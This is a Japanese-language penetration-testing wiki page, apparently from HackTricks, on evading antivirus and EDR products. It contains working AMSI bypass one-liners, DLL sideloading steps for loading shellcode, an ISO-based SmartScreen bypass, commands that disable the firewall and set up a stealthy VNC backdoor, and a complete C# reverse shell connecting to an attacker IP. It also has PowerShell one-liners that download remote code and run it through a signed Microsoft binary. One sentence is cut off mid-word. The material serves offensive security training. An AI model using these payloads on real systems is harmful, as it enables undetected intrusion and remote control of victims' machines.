# アンチウイルス（AV）バイパス

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

**このページは** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**によって書かれました！**

## **AV回避の方法論**

現在、AVはファイルが悪意のあるものかどうかをチェックするために、静的検出、動的解析、さらに高度なEDRでは行動分析といった異なる方法を使用しています。

### **静的検出**

静的検出は、バイナリやスクリプト内の既知の悪意のある文字列やバイトの配列をフラグ付けすることで達成されます。また、ファイル自体から情報を抽出することもあります（ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）。これは、既知の公開ツールを使用すると、それらが分析されて悪意のあるものとしてフラグ付けされている可能性があるため、より簡単に検出される可能性があります。この種の検出を回避するためのいくつかの方法があります。

* **暗号化**

バイナリを暗号化すると、AVがプログラムを検出する方法はありませんが、プログラムをメモリに復号化して実行するためのローダーが必要です。

* **曖昧化**

AVを回避するためには、バイナリやスクリプト内の一部の文字列を変更するだけで十分な場合がありますが、曖昧化する内容によっては時間がかかる場合があります。

* **カスタムツール**

独自のツールを開発すると、既知の悪い署名は存在しないため、ただし、時間と労力がかかります。

{% hint style="info" %}
Windows Defenderの静的検出に対してチェックするための良い方法は、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)です。これは、ファイルを複数のセグメントに分割し、それぞれをDefenderにスキャンさせることで、バイナリ内のフラグ付けされた文字列やバイトを正確に特定できます。
{% endhint %}

実践的なAV回避についての[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf)をぜひご覧ください。

### **動的解析**

動的解析は、AVがバイナリをサンドボックスで実行し、悪意のある活動（ブラウザのパスワードの復号化や読み取り、LSASSのミニダンプの実行など）を監視することです。これは少し複雑な作業になる場合がありますが、サンドボックスを回避するために次のことができます。

* **実行前のスリープ** 実装方法によっては、AVの動的解析を回避する素晴らしい方法になる場合があります。AVはファイルをスキャンするための非常に短い時間しか持っていないため、長いスリープを使用するとバイナリの解析が妨げられる可能性があります。ただし、多くのAVのサンドボックスは、実装方法によってはスリープをスキップすることができます。

* **マシンのリソースのチェック** 通常、サンドボックスは非常に少ないリソースしか使用できません（例：2GB未満のRAM）。また、CPUの温度やファンの回転数をチェックするなど、非常にクリエイティブになることもできます。すべてがサンドボックスに実装されているわけではありません。

* **マシン固有のチェック** "contoso.local"ドメインに参加しているユーザーをターゲットにしたい場合、コンピュータのドメインをチェックして指定したドメインと一致するかどうかを確認し、一致しない場合はプログラムを終了させることができます。

実際には、Microsoft Defenderのサンドボックスのコンピュータ名はHAL9THです。したがって、マルウェアを爆発させる前にコンピュータ名をチェックし、名前がHAL9THと一致する場合は、Defenderのサンドボックス内にいることを意味しますので、プログラムを終了させることができます。

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

サンドボックスに対して[@mgeeky](https://twitter.com/mariuszbit)からの他の素晴らしいヒント

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この投稿で以前に述べたように、**公開ツール**は最終的に**検出されます**ので、次のことを考える必要があります。

たとえば、LSASSをダンプする場合、**本当にmim
## EXEs vs DLLs

いつでも可能な限り、回避のために**DLLの使用を優先**してください。私の経験では、DLLファイルは通常**検出されにくく分析されにくい**ため、いくつかのケースで検出を回避するための非常にシンプルなトリックです（もちろん、ペイロードがDLLとして実行される方法がある場合に限ります）。

この画像では、HavocのDLLペイロードの検出率がantiscan.meで4/26であるのに対し、EXEペイロードの検出率は7/26です。

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.meにおける通常のHavoc EXEペイロードと通常のHavoc DLLの比較</p></figcaption></figure>

次に、DLLファイルをよりステルス性の高いものにするためのいくつかのトリックを紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading**は、ローダーが使用するDLLの検索順序を利用し、被害者アプリケーションと悪意のあるペイロードを隣り合わせに配置することで利用します。

[Siofra](https://github.com/Cybereason/siofra)と以下のPowerShellスクリプトを使用して、DLL Sideloadingの対象となるプログラムを確認できます。

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは、「C:\Program Files\\」内のDLLハイジャックの影響を受ける可能性のあるプログラムのリストと、それらが読み込もうとするDLLファイルを出力します。

私は、**DLLハイジャック可能/サイドロード可能なプログラムを自分で調査することを強くお勧めします**。このテクニックは、適切に行われればかなりステルス性がありますが、公に知られているDLLサイドロード可能なプログラムを使用すると、簡単に発見される可能性があります。

プログラムが読み込むことを期待しているDLLの名前を持つ悪意のあるDLLを配置するだけでは、ペイロードが読み込まれません。なぜなら、プログラムはそのDLL内の特定の関数を期待しているからです。この問題を解決するために、別のテクニックである**DLLプロキシング/フォワーディング**を使用します。

**DLLプロキシング**は、プログラムがプロキシ（および悪意のある）DLLからオリジナルのDLLに行う呼び出しを転送し、プログラムの機能を保持しながらペイロードの実行を処理することができます。

私は、[@flangvik](https://twitter.com/Flangvik/)の[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)プロジェクトを使用します。

以下は私が実行した手順です：

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

最後のコマンドは、2つのファイルを提供します：DLLのソースコードテンプレートと、元の名前が変更されたDLL。

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

以下は結果です：

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

私たちのシェルコード（[SGN](https://github.com/EgeBalci/sgn)でエンコードされています）とプロキシDLLの両方が、[antiscan.me](https://antiscan.me)で0/26の検出率を持っています！これは成功と言えるでしょう。

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
DLL Sideloadingについては、[S3cur3Th1sSh1tのtwitch VOD](https://www.twitch.tv/videos/1644171543)と[ippsecのビデオ](https://www.youtube.com/watch?v=3eROsG\_WNpE)を見ることを**強くお勧めします**。これにより、私たちがより詳しく議論した内容を学ぶことができます。
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freezeは、中断されたプロセス、直接のシスコール、および代替実行方法を使用してEDRをバイパスするためのペイロードツールキットです`

Freezeを使用すると、ステルス性のある方法でシェルコードをロードして実行することができます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
回避はただの猫とネズミのゲームであり、今日うまくいっても明日は検出される可能性があるため、1つのツールに頼ることはありません。可能な限り、複数の回避技術を組み合わせて試してみてください。
{% endhint %}

## AMSI（Anti-Malware Scan Interface）

AMSIは、"[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless\_malware)"を防ぐために作成されました。最初は、AVは**ディスク上のファイル**のみをスキャンすることができました。したがって、何らかの方法でペイロードを**直接メモリ上で実行**できれば、AVはそれを防ぐ手段を持っていませんでした。

AMSI機能は、Windowsのこれらのコンポーネントに統合されています。

- ユーザーアカウント制御（EXE、COM、MSI、またはActiveXの昇格）
- PowerShell（スクリプト、インタラクティブ使用、および動的コード評価）
- Windowsスクリプトホスト（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBAマクロ

これにより、アンチウイルスソリューションは、スクリプトの動作を検査するために、スクリプトの内容を暗号化されずに非難読可能な形式で公開できます。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで次のアラートが表示されます。

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

注意してください。スクリプトが実行された実行可能ファイルのパス（この場合はpowershell.exe）の前に`amsi:`が付加されています。

ディスクにファイルをドロップしていないにもかかわらず、AMSIのためにメモリ上で検出されました。

AMSIを回避する方法はいくつかあります。

* **難読化**

AMSIは主に静的検出で動作するため、読み込もうとするスクリプトを変更することは検出を回避する良い方法です。

ただし、AMSIは複数のレイヤーを持つスクリプトの難読化を解除する能力を持っているため、難読化は行われている方法によっては適切なオプションではありません。これにより、回避が直接的ではなくなります。ただし、変数名をいくつか変更するだけで十分な場合もありますので、フラグが立てられたものによって異なります。

* **AMSIバイパス**

AMSIは、powershell（またはcscript.exe、wscript.exeなど）プロセスにDLLをロードすることで実装されているため、特権のないユーザーとして実行していても簡単に操作することができます。AMSIの実装上のこの欠陥により、研究者はAMSIスキャンを回避するための複数の方法を見つけました。

**エラーの強制**

AMSIの初期化を失敗させる（amsiInitFailed）ことにより、現在のプロセスに対してスキャンが開始されないようにすることができます。これはもともと[マット・グレイバー](https://twitter.com/mattifestation)によって開示され、Microsoftは広範な使用を防ぐためのシグネチャを開発しました。
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在のPowerShellプロセスでAMSIを使用できなくするために、わずかなPowerShellコードの1行が必要でした。もちろん、この行はAMSI自体によってフラグが立てられているため、このテクニックを使用するためにはいくつかの修正が必要です。

以下は、この[GitHub Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)から取得した修正されたAMSIバイパスです。
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**メモリパッチング**

この技術は、最初に[@RastaMouse](https://twitter.com/_RastaMouse/)によって発見され、amsi.dll内の"AmsiScanBuffer"関数のアドレスを見つけ、それをE_INVALIDARGのコードを返すように上書きすることで、実際のスキャン結果が0として解釈されるようにするものです。

{% hint style="info" %}
詳しい説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)を参照してください。
{% endhint %}

また、PowerShellでAMSIをバイパスするために使用される他の多くの技術もあります。詳細については、[**このページ**](basic-powershell-for-pentesters/#amsi-bypass)と[このリポジトリ](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)を参照してください。

## オブフスケーション

C#のクリアテキストコードを**オブフスケート**するために使用できるいくつかのツールや、バイナリをコンパイルするための**メタプログラミングテンプレート**を生成したり、**コンパイルされたバイナリをオブフスケート**するためのツールがあります。

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#オブフスケーター**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/)コンパイルスイートのオープンソースフォークを提供し、[コードのオブフスケーション](http://en.wikipedia.org/wiki/Obfuscation_(software))と改ざん防止を通じてソフトウェアのセキュリティを向上させることです。
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使用せずに、コンパイル時に`C++11/14`言語を使用してオブフスケートされたコードを生成する方法を示しています。
* [**obfy**](https://github.com/fritzone/obfy): C++テンプレートメタプログラミングフレームワークによって生成されたオブフスケートされた操作のレイヤーを追加し、アプリケーションをクラックしようとする人の生活を少し難しくします。
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまな異なるPEファイルをオブフスケートすることができるx64バイナリオブフスケーターです。
* [**metame**](https://github.com/a0rtega/metame): Metameは、任意の実行可能ファイルのためのシンプルな変形コードエンジンです。
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP（return-oriented programming）を使用してLLVMサポートされた言語のための細かい粒度のコードオブフスケーションフレームワークです。ROPfuscatorは、通常の制御フローの自然な概念を妨げるため、通常の命令をROPチェーンに変換することで、アセンブリコードレベルでプログラムをオブフスケートします。
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcryptは、Nimで書かれた.NET PE Crypterです。
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは、既存のEXE/DLLをシェルコードに変換し、それをロードすることができます。

## SmartScreenとMoTW

インターネットから実行可能ファイルをダウンロードして実行する際に、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreenは、潜在的に悪意のあるアプリケーションの実行を防ぐためのセキュリティメカニズムです。

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主に評判ベースのアプローチで動作し、一般的にダウンロードされないアプリケーションはSmartScreenをトリガーし、エンドユーザーにファイルの実行を警告して防止します（ただし、詳細情報-> とクリックして実行を続けることもできます）。

**MoTW**（Mark of The Web）は、インターネットからファイルをダウンロードすると自動的に作成されるZone.Identifierという名前の[NTFSの代替データストリーム](https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS))です。

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSをチェックします。</p></figcaption></figure>

{% hint style="info" %}
重要なことは、**信頼された**署名証明書で署名された実行可能ファイルは、SmartScreenをトリガーしないということです。
{% endhint %}

Mark of The Webを回避するために、ペイロードをISOなどのコンテナにパッケージ化する方法が非常に効果的です。これは、Mark-of-the-Web（MOTW）が**非NTFS**ボリュームには適用できないためです。

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するためにペイロードを出力コンテナにパッケージ化するツールです。

使用例：
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
以下は、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)を使用してISOファイル内にペイロードをパッケージ化してSmartScreenをバイパスするデモです。

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C#アセンブリのリフレクション

C#バイナリをメモリにロードする方法はかなり以前から知られており、AVに検出されずにポストエクスプロイテーションツールを実行する非常に優れた方法です。

ペイロードはディスクに触れずに直接メモリにロードされるため、プロセス全体のAMSIのパッチ適用について心配する必要はありません。

ほとんどのC2フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havocなど）はすでにメモリ内でC#アセンブリを直接実行する機能を提供していますが、実行方法はさまざまです。

* **Fork\&Run**

これは、**新しい犠牲プロセスを生成**し、ポストエクスプロイテーションの悪意のあるコードをその新しいプロセスに注入し、悪意のあるコードを実行し、終了したら新しいプロセスを終了するというものです。これには利点と欠点があります。フォークと実行のメリットは、実行が**Beaconインプラントプロセスの外部**で行われることです。これは、ポストエクスプロイテーションのアクションで何かがうまくいかなかったり検出されたりした場合、**インプラントが生き残る可能性がはるかに高い**ということを意味します。欠点は、**行動検出**によって**検出される可能性が高い**ということです。

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

これは、ポストエクスプロイテーションの悪意のあるコードを**独自のプロセスに注入**することです。これにより、新しいプロセスを作成してAVにスキャンされることを回避できますが、ペイロードの実行中に何かがうまくいかない場合、**ビーコンがクラッシュしてしまう可能性がはるかに高くなります**。

<figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
C#アセンブリのロードについて詳しく読みたい場合は、この記事[https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)とそのInlineExecute-Assembly BOF([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))をご覧ください。
{% endhint %}

また、PowerShellからもC#アセンブリをロードすることができます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)と[S3cur3th1sSh1tのビデオ](https://www.youtube.com/watch?v=oe11Q-3Akuk)をチェックしてください。

## 他のプログラミング言語の使用

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)で提案されているように、攻撃者が制御するSMB共有へのアクセスを妨害されたマシンに与えることで、他の言語を使用して悪意のあるコードを実行することが可能です。

SMB共有上のインタプリタ環境とインタプリタバイナリにアクセスを許可することで、妨害されたマシンのメモリ内でこれらの言語で任意のコードを実行できます。

リポジトリは次のように述べています：Defenderはスクリプトをスキャンしますが、Go、Java、PHPなどを利用することで、静的な署名をバイパスする**柔軟性が向上**します。これらの言語でランダムな非難読み込み逆シェルスクリプトをテストした結果、成功しました。

## 高度な回避

回避は非常に複雑なトピックであり、1つのシステムに多くの異なるテレメトリソースを考慮する必要があるため、成熟した環境では完全に検出を回避することはほぼ不可能です。

対戦するすべての環境にはそれぞれ独自の強みと弱点があります。

[@ATTL4S](https://twitter.com/DaniLJ94)のこのトークを見ることを強くお勧めします。これにより、より高度な回避技術についての基礎が得られます。

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

[@mariuszbit](https://twitter.com/mariuszbit)によるEvasion in Depthについての素晴らしいトークもあります。

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **古いテクニック**

### **Telnetサーバー**

Windows10まで、すべてのWindowsには**Telnetサーバー**が付属しており、（管理者として）インストールすることができました。
```
pkgmgr /iu:"TelnetServer" /quiet
```
システムが起動したときに**開始**し、**今すぐ実行**します：
```
sc config TlntSVR start= auto obj= localsystem
```
**telnetポートの変更**（ステルス）とファイアウォールの無効化:

```plaintext
1. レジストリエディタを開きます。
2. HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces に移動します。
3. ネットワークインターフェースのGUIDを見つけます。
4. 新しいDWORD値を作成し、名前を"TcpAllowedPorts"とします。
5. 値データに変更したいポート番号を入力します（例: 1337）。
6. レジストリを保存し、エディタを閉じます。

ファイアウォールの無効化:
1. コントロールパネルを開きます。
2. "Windows Defender ファイアウォール"を選択します。
3. "Windows Defender ファイアウォールの設定の変更"をクリックします。
4. "プライベート ネットワークの設定"と"パブリック ネットワークの設定"の両方で"ファイアウォールをオフにする"を選択します。
5. 変更を保存し、コントロールパネルを閉じます。
```

これにより、telnetポートが変更され、ファイアウォールが無効化されます。
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

以下からダウンロードしてください：[http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（セットアップではなく、バイナリのダウンロードが必要です）

**ホスト側での設定**：_**winvnc.exe**_ を実行し、サーバーを設定します：

* _Disable TrayIcon_ オプションを有効にします
* _VNC Password_ にパスワードを設定します
* _View-Only Password_ にパスワードを設定します

その後、バイナリの _**winvnc.exe**_ と新しく作成されたファイル _**UltraVNC.ini**_ を **被害者** の中に移動します

#### **逆接続**

**攻撃者**は、彼の **ホスト** 内でバイナリ `vncviewer.exe -listen 5900` を実行して、逆接続の **VNC 接続** を受け付ける準備をします。その後、**被害者** の中で、winvnc デーモンを起動します `winvnc.exe -run` そして `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**警告:** ステルス性を維持するためには、以下のことを行わないでください

* 既に実行中の場合は `winvnc` を起動しないでください。そうすると [ポップアップ](https://i.imgur.com/1SROTTl.png) が表示されます。実行中かどうかは `tasklist | findstr winvnc` で確認してください
* 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。そうすると [設定ウィンドウ](https://i.imgur.com/rfMQWcf.png) が開きます
* ヘルプのために `winvnc -h` を実行しないでください。そうすると [ポップアップ](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

以下からダウンロードしてください：[https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT内部：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
今、`msfconsole -r file.rc`でリスナーを開始し、次のコマンドでXMLペイロードを実行します：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在の防御者はプロセスを非常に速く終了します。**

### 自分自身の逆シェルをコンパイルする

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初のC#逆シェル

次のコマンドでコンパイルします：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
以下の方法で使用してください:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
[https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)

### コンパイラを使用したC#
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C#の難読化ツールリスト: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
[https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)

Merlin, Empire, Puppy, SalsaTools [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)

[https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)

[https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)

{% embed url="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html" %}

{% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
